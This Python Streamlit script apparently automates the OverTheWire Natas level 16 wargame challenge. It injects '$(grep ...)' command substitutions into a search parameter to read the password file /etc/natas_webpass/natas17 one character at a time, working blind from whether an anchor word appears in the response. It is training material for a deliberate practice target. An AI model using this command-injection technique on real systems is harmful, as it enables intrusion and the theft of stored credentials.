import streamlit as st
import string

def run(context, session, base_url):
    st.info("Targeting Command Substitution via pattern-based input evaluation...")
    
    # 1. Define character pool and structure rules
    charset = string.ascii_letters + string.digits
    discovered_password = ""
    password_length = 32
    
    # Use a known anchor word from the dictionary file to detect state changes
    anchor_word = "Africans"
    
    # Setup target credentials for Level 16
    username = "natas16"
    current_level_password = context.get('password', '').strip()
    session.auth = (username, current_level_password)
    
    # 2. Identify which characters are present in the password string
    st.write("🔍 Scanning command baseline to detect active character profiles...")
    active_chars = []
    
    char_progress = st.progress(0)
    for idx, char in enumerate(charset):
        char_progress.progress((idx + 1) / len(charset))
        
        # Payload checks if character exists anywhere inside the target password file
        payload = f'{anchor_word}$(grep {char} /etc/natas_webpass/natas17)'
        
        try:
            response = session.get(base_url, params={"needle": payload}, timeout=5)
            # If the anchor word disappears from the output, it means the inner grep found a match
            if anchor_word not in response.text:
                active_chars.append(char)
        except Exception:
            continue
            
    st.write(f"✨ Detected active password characters: `{', '.join(active_chars)}`")
    
    if not active_chars:
        st.error("Failed to detect active characters. Check your connection or password parameters.")
        return

    # 3. Reconstruct the password sequentially position by position
    st.write("🔄 Resolving token string array structure...")
    password_display = st.empty()
    step_progress = st.progress(0)
    
    for position in range(1, password_length + 1):
        found_character_for_position = False
        
        for char in active_chars:
            # Build the anchor string checking what the password starts with up to the current index
            test_prefix = discovered_password + char
            payload = f'{anchor_word}$(grep ^{test_prefix} /etc/natas_webpass/natas17)'
            
            try:
                response = session.get(base_url, params={"needle": payload}, timeout=5)
                
                # If the anchor text vanishes, our prefix guess is completely correct
                if anchor_word not in response.text:
                    discovered_password += char
                    password_display.code(f"Current Progress: {discovered_password}")
                    found_character_for_position = True
                    break
            except Exception as e:
                st.error(f"Connection timed out during analysis: {str(e)}")
                return
                
        step_progress.progress(position / password_length)
        
        if not found_character_for_position:
            st.warning(f"Could not safely resolve index entry {position}. Stopping operation loop.")
            break

    # 4. Present Results
    if len(discovered_password) == password_length:
        st.success("🎯 Level 16 challenge resolved successfully!")
        st.code(f"Natas 17 Password: {discovered_password}")
    else:
        st.warning("Sequence complete, but length does not match expected size parameters.")
        if discovered_password:
            st.code(f"Partial Signature Tracked: {discovered_password}")